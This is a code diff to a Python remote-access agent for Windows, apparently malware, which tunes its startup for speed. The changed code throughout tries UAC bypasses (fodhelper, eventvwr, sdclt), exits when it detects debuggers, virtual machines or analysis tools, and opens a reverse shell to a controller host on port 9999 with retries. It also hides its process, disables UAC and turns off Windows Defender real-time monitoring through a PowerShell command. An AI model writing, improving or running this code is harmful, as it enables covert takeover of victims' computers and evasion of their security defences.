@@ -107,7 +107,7 @@ def elevate_privileges():
         try:
             if os.geteuid() != 0:
                 # Try to use sudo if available
-                subprocess.run(['sudo', '-n', 'true'], check=True, capture_output=True)
+                subprocess.run(['sudo', '-n', 'true'], check=True, capture_output=True, timeout=2)
                 return True
         except:
             pass
@@ -116,33 +116,18 @@ def elevate_privileges():
     if is_admin():
         return True
     
-    # Advanced UAC bypass methods (UACME-inspired)
-    bypass_methods = [
-        bypass_uac_cmlua_com,           # Method 41: ICMLuaUtil COM interface
+    # Quick UAC bypass methods (only try the most reliable ones to reduce startup time)
+    quick_bypass_methods = [
         bypass_uac_fodhelper_protocol,  # Method 33: fodhelper ms-settings protocol
-        bypass_uac_computerdefaults,    # Method 33: computerdefaults registry
-        bypass_uac_dccw_com,           # Method 43: IColorDataProxy COM
-        bypass_uac_dismcore_hijack,    # Method 23: DismCore.dll hijack
-        bypass_uac_wow64_logger,       # Method 30: WOW64 logger hijack
-        bypass_uac_silentcleanup,      # Method 34: SilentCleanup scheduled task
-        bypass_uac_token_manipulation, # Method 35: Token manipulation
-        bypass_uac_junction_method,    # Method 36: NTFS junction/reparse
-        bypass_uac_cor_profiler,       # Method 39: .NET Code Profiler
-        bypass_uac_com_handlers,       # Method 40: COM handler hijack
-        bypass_uac_volatile_env,       # Method 44: Environment variable expansion
-        bypass_uac_slui_hijack,        # Method 45: slui.exe hijack
         bypass_uac_eventvwr,           # Method 25: EventVwr.exe registry hijacking
         bypass_uac_sdclt,              # Method 31: sdclt.exe bypass
-        bypass_uac_wsreset,            # Method 56: WSReset.exe bypass
-        bypass_uac_appinfo_service,    # Method 61: AppInfo service manipulation
-        bypass_uac_mock_directory,     # Method 62: Mock directory technique
-        bypass_uac_winsat,             # Method 67: winsat.exe bypass
-        bypass_uac_mmcex,              # Method 68: MMC snapin bypass
     ]
     
-    for method in bypass_methods:
+    print("Attempting quick privilege escalation...")
+    for method in quick_bypass_methods:
         try:
             if method():
+                print(f"Privilege escalation successful using {method.__name__}")
                 return True
         except Exception as e:
             print(f"UAC bypass method {method.__name__} failed: {e}")
@@ -1710,53 +1695,40 @@ def setup_persistence():
         return False
 
 def anti_analysis():
-    """Anti-analysis and evasion techniques."""
+    """Anti-analysis and evasion techniques (optimized for faster startup)."""
     try:
-        # Check for common analysis tools
-        analysis_processes = [
-            'ollydbg.exe', 'x64dbg.exe', 'windbg.exe', 'ida.exe', 'ida64.exe',
-            'wireshark.exe', 'fiddler.exe', 'vmware.exe', 'vbox.exe', 'virtualbox.exe',
-            'procmon.exe', 'procexp.exe', 'autoruns.exe', 'regmon.exe', 'filemon.exe'
+        # Quick check for common analysis tools (reduced list for faster startup)
+        critical_analysis_processes = [
+            'ollydbg.exe', 'x64dbg.exe', 'ida.exe', 'procmon.exe', 'wireshark.exe'
         ]
         
-        for proc in psutil.process_iter(['name']):
-            if proc.info['name'].lower() in analysis_processes:
-                # If analysis tool detected, sleep and exit
-                time.sleep(60)
+        running_processes = [proc.info['name'].lower() for proc in psutil.process_iter(['name'])]
+        for analysis_proc in critical_analysis_processes:
+            if analysis_proc in running_processes:
+                # If critical analysis tool detected, exit immediately
                 sys.exit(0)
         
-        # Check for VM environment
-        vm_indicators = [
-            'VBOX', 'VMWARE', 'QEMU', 'VIRTUAL', 'XEN'
-        ]
-        
+        # Quick VM check (skip WMI for faster startup)
         try:
-            import wmi
-            c = wmi.WMI()
-            for system in c.Win32_ComputerSystem():
-                if any(indicator in system.Model.upper() for indicator in vm_indicators):
-                    time.sleep(60)
-                    sys.exit(0)
+            # Check common VM registry keys
+            if WINDOWS_AVAILABLE:
+                import winreg
+                vm_keys = [
+                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools"),
+                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions"),
+                ]
+                for hkey, key_path in vm_keys:
+                    try:
+                        winreg.OpenKey(hkey, key_path)
+                        sys.exit(0)  # VM detected
+                    except:
+                        continue
         except:
             pass
         
-        # Check for debugger
-        if ctypes.windll.kernel32.IsDebuggerPresent():
-            time.sleep(60)
+        # Quick debugger check
+        if WINDOWS_AVAILABLE and ctypes.windll.kernel32.IsDebuggerPresent():
             sys.exit(0)
-        
-        # Anti-sandbox: Check for mouse movement
-        try:
-            import win32gui
-            pos1 = win32gui.GetCursorPos()
-            time.sleep(2)
-            pos2 = win32gui.GetCursorPos()
-            if pos1 == pos2:
-                # No mouse movement, might be sandbox
-                time.sleep(60)
-                sys.exit(0)
-        except:
-            pass
         
         return True
         
@@ -1779,8 +1751,8 @@ def obfuscate_strings():
     return obfuscated
 
 def sleep_random():
-    """Random sleep to avoid pattern detection."""
-    sleep_time = random.uniform(0.5, 2.0)
+    """Random sleep to avoid pattern detection (optimized for faster startup)."""
+    sleep_time = random.uniform(0.1, 0.5)  # Reduced sleep time
     time.sleep(sleep_time)
 
 # --- Agent State ---
@@ -2142,10 +2114,34 @@ def reverse_shell_handler(agent_id):
     try:
         # Create socket connection back to controller
         REVERSE_SHELL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        controller_host = SERVER_URL.split("://")[1].split(":")[0]  # Extract host from SERVER_URL
+        # Fix host extraction from SERVER_URL
+        if "://" in SERVER_URL:
+            url_part = SERVER_URL.split("://")[1]
+            if ":" in url_part:
+                controller_host = url_part.split(":")[0]
+            else:
+                controller_host = url_part.split("/")[0]  # Handle case without port
+        else:
+            controller_host = SERVER_URL.split("/")[0]  # Fallback
+        
+        # For onrender.com URLs, we need to handle the subdomain properly
+        if "onrender.com" in controller_host:
+            # Use the full hostname but extract the base for connection
+            controller_host = controller_host.split("/")[0]  # Remove any path
+        
         controller_port = 9999  # Dedicated port for reverse shell
         
-        REVERSE_SHELL_SOCKET.connect((controller_host, controller_port))
+        print(f"Attempting to connect to {controller_host}:{controller_port}")
+        REVERSE_SHELL_SOCKET.settimeout(10)  # 10 second timeout
+        
+        # Try to connect to the specified port
+        try:
+            REVERSE_SHELL_SOCKET.connect((controller_host, controller_port))
+        except (ConnectionRefusedError, OSError, socket.error) as e:
+            print(f"Connection to {controller_host}:{controller_port} failed: {e}")
+            print("Note: Reverse shell requires the controller to have port 9999 open.")
+            REVERSE_SHELL_SOCKET.close()
+            return
         print(f"Reverse shell connected to {controller_host}:{controller_port}")
         
         # Send initial connection info
@@ -2252,8 +2248,8 @@ def stop_reverse_shell():
 
 def auto_start_reverse_shell(agent_id):
     """Automatically start reverse shell with retry logic."""
-    max_retries = 10
-    retry_delay = 5
+    max_retries = 5  # Reduced from 10 for faster startup
+    retry_delay = 3  # Reduced from 5 seconds
     
     for attempt in range(max_retries):
         try:
@@ -3332,62 +3328,57 @@ def kill_task_manager():
         return f"Task Manager termination failed: {e}"
 
 if __name__ == "__main__":
-    # Run UAC checks and elevation FIRST
+    # Run quick anti-analysis checks first
+    try:
+        anti_analysis()
+    except:
+        pass
+    
+    print("Initializing agent...")
+    
+    # Quick privilege check and elevation
     if WINDOWS_AVAILABLE:
-        # Try to run as admin first
         if not is_admin():
             print("Attempting to run as administrator...")
             if run_as_admin():
                 # Script will restart with admin privileges
                 sys.exit()
         
-        # If we're admin, disable UAC
+        # If we're admin, quickly disable UAC
         if is_admin():
             print("Running with administrator privileges")
-            if disable_uac():
-                print("UAC disabled successfully")
-            else:
-                print("Could not disable UAC")
+            try:
+                if disable_uac():
+                    print("UAC disabled successfully")
+            except:
+                pass
     
-    # Run anti-analysis checks
-    try:
-        anti_analysis()
-    except:
-        pass
+    # Quick privilege escalation attempt
+    if not is_admin():
+        print("Agent running with user privileges, attempting quick elevation...")
+        try:
+            if elevate_privileges():
+                print("Privilege escalation successful")
+        except:
+            pass
     
-    # Initialize stealth and privilege escalation
-    print("Initializing agent...")
-    
-    # Random sleep to avoid pattern detection
-    sleep_random()
-    
-    # Check current privileges
-    if is_admin():
-        print("Agent running with admin privileges")
-        # Disable Windows Defender if possible
-        if disable_defender():
-            print("Windows Defender disabled")
-        else:
-            print("Could not disable Windows Defender")
-    else:
-        print("Agent running with user privileges, attempting elevation...")
-        if elevate_privileges():
-            print("Privilege escalation successful")
-        else:
-            print("Privilege escalation failed, continuing with user privileges")
-    
-    # Setup stealth features
+    # Setup basic stealth features (skip time-consuming ones)
     try:
         hide_process()
-        setup_persistence()
-        
-        # Establish advanced persistence using UACME-inspired techniques
-        if establish_persistence():
-            print("Advanced persistence mechanisms established")
-        
+        # Skip complex persistence setup for faster startup
         print("Stealth features initialized")
     except Exception as e:
         print(f"Stealth initialization warning: {e}")
+    
+    # Quick Windows Defender disable attempt if admin
+    if is_admin():
+        try:
+            # Try quick defender disable
+            subprocess.run(['powershell.exe', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'], 
+                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
+            print("Windows Defender disabled")
+        except:
+            pass
     
     agent_id = get_or_create_agent_id()
     print(f"Agent starting with ID: {agent_id}")
